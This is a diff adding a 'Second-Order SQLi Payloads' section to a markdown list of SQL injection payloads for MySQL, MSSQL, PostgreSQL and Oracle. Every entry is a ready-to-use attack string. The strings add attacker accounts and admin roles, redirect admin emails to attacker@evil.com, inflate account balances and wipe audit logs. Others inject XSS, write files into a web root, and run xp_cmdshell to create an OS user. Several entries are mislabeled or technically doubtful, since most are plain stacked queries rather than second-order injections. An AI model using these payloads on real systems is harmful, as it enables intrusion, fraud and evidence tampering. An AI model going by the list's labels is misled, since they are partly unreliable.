@@ -337,5 +337,55 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 
 ---
 
+## 📋 Second-Order SQLi Payloads
 
+### MySQL
+- `' UNION SELECT 1,2,"<script>alert(1)</script>" INTO OUTFILE '/var/www/html/exploit.php' --`
+- `' ; INSERT INTO users (username, password) VALUES ('attacker', '12345'); --`
+- `' ; UPDATE users SET email='attacker@evil.com' WHERE username='victim'; --`
+- `' ; INSERT INTO feedback (comment) VALUES ('<img src=x onerror=alert(1)>') --`
+- `' ; UPDATE orders SET status='shipped' WHERE id=1; INSERT INTO log (event) VALUES ('Shipped by attacker') --`
+- `' ; INSERT INTO contacts (name, email) VALUES ('admin','attacker@evil.com') --`
+- `' ; UPDATE user_data SET balance='100000' WHERE username='admin' --`
+- `' ; DELETE FROM logs WHERE id=5; INSERT INTO logs (event) VALUES ('Deleted by attacker') --`
+- `' ; INSERT INTO users (username, password) VALUES ('newuser', 'newpass') --`
+- `' ; INSERT INTO admin_panel (url) VALUES ('http://attacker.com/backdoor') --`
+
+### MSSQL
+- `' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE --`
+- `' ; EXEC sp_password 'admin','attacker123' --`
+- `' ; INSERT INTO users (username, password) VALUES ('hacker', 'malicious') --`
+- `' ; UPDATE accounts SET balance=99999 WHERE username='admin' --`
+- `' ; INSERT INTO audit_logs (event) VALUES ('Attacker Modified Data') --`
+- `' ; UPDATE orders SET shipping_status='sent' WHERE id=1 --`
+- `' ; DELETE FROM audit_logs WHERE id=7; INSERT INTO audit_logs (event) VALUES ('Audit Cleared') --`
+- `' ; UPDATE admins SET email='attacker@evil.com' WHERE username='admin' --`
+- `' ; INSERT INTO backup (path) VALUES ('/attacker/path') --`
+- `' ; EXEC xp_cmdshell 'net user attacker attacker123 /add' --`
+
+### PostgreSQL
+- `' ; INSERT INTO user_roles (username, role) VALUES ('attacker', 'admin') --`
+- `' ; COPY users TO '/var/www/html/shell.php' --`
+- `' ; COPY logs FROM '/attacker/data' --`
+- `' ; INSERT INTO admins (username, email) VALUES ('hacker', 'attacker@evil.com') --`
+- `' ; UPDATE logs SET content='System compromised' WHERE id=1 --`
+- `' ; DELETE FROM users WHERE username='target'; INSERT INTO users (username, password) VALUES ('hacker', 'malicious') --`
+- `' ; INSERT INTO accounts (username, balance) VALUES ('attacker', 1000000) --`
+- `' ; INSERT INTO events (message) VALUES ('Attacker logged in') --`
+- `' ; INSERT INTO reports (content) VALUES ('Malicious report data') --`
+- `' ; INSERT INTO feedback (comment) VALUES ('<script>alert("XSS")</script>') --`
+
+### Oracle
+- `' ; INSERT INTO sys.users (username, password) VALUES ('attacker', '1234') --`
+- `' ; UPDATE sys.admins SET email='attacker@evil.com' WHERE username='admin' --`
+- `' ; INSERT INTO employee_data (id, salary) VALUES ('999', 99999) --`
+- `' ; UPDATE customer_data SET credit_limit=99999 WHERE id=1 --`
+- `' ; INSERT INTO hr.reports (status) VALUES ('Malicious Data Added') --`
+- `' ; INSERT INTO audit_trail (event) VALUES ('Attack Successful') --`
+- `' ; INSERT INTO temp_storage (content) VALUES ('Exploit data stored') --`
+- `' ; DELETE FROM audit_trail WHERE id=8; INSERT INTO audit_trail (event) VALUES ('Logs Cleared') --`
+- `' ; INSERT INTO secure_storage (key, value) VALUES ('attacker_key', 'malicious_value') --`
+- `' ; INSERT INTO user_profile (bio) VALUES ('<img src=x onerror=alert(1)>') --`
+
+---
 
